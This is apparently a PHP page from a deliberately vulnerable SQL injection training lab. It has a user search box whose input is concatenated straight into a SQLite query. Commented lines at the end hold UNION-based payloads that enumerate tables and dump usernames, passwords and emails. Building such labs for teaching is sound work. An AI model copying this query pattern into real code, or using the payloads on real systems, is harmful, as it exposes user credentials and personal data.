<?php
require __DIR__ . '/../functions.php';






    


    load_header("User Search");
    ?>

    <h2>Extracting Data with Union-Based SQL Injection</h2>
    <h3>Get hidden information about users by Union based SQL Injection</h3> 
    <hr class="divider">
   



    <?php
// Database initialization
$db = new SQLite3('lab.db');
$db->enableExceptions(true);
// Initialize error message
$message = '';

// Handle search query
if (isset($_GET['search'])) {
    $search = $_GET['search'];
    #echo "SELECT username FROM users WHERE username LIKE '%$search%'";
    $query = "SELECT username FROM users WHERE username LIKE '%$search%'";
    try {
     $result = $db->query($query);
    }
    catch (Exception $e){
        echo 'Caught exception: ' . $e->getMessage();
        exit;
    }

    // Vulnerable to UNION-based SQL injection
    if ($result) {
        $rows = [];
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            $rows[] = $row['username'];
        }

        if (empty($rows)) {
            $message = "No results found.";
        } else {
            $message = "Results: " . implode(", ", $rows);
        }
    } else {
        $message = "An error occurred.";

    }
}
?>


    <style>
        .lab {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f3f3f3; /* Light gray background */
            color: black;
        }

        .header {
            background-color: #232f3e; /* Amazon dark blue */
            color: white;
            padding: 10px 20px;
            text-align: center;
        }

        .header h1 {
            margin: 0;
            font-size: 24px;
        }

        .container {
            margin: 20px auto;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            
        }

        .lab h2 {
            color: #232f3e;
            font-size: 20px;
            margin-bottom: 20px;
        }

        form {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 5px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }

        button {
            background-color: #ff9900; /* Amazon orange */
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #e68a00;
        }

        .message {
            padding: 10px;
            border-radius: 4px;
            font-size: 14px;
            color: white;
        }

        .error {
            background-color: #d9534f; /* Red for error */
        }

        .success {
            background-color: #5cb85c; /* Green for success */
        }

        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #555;
        }

        .footer a {
            color: #0066c0; /* Amazon blue link */
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
<div class="lab">
    <div class="header">
        <h1>Search users</h1>
    </div>
    <div class="container">
        <h2>Search for a Username</h2>
        <p>Use the search box below to look for usernames in the database:</p>
        <form method="GET" action="">
            <label for="search">Search:</label>
            <input type="text" id="search" name="search" placeholder="Enter username...">
            <button type="submit">Search</button>
        </form>

        <?php if (!empty($message)): ?>
            <div class="message <?php echo strpos($message, 'Results') !== false ? 'success' : 'error'; ?>">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>
    </div>
        </div>




    <?php
    load_footer();

##xxxxxxxx' UNION SELECT name FROM sqlite_master WHERE type like 'table
##xxxxxxxx' UNION SELECT sql FROM sqlite_master WHERE tbl_name like 'users
##xxxxxxxx' UNION SELECT concat(username,' ', password, ' ', email)  from users where username like '



?>
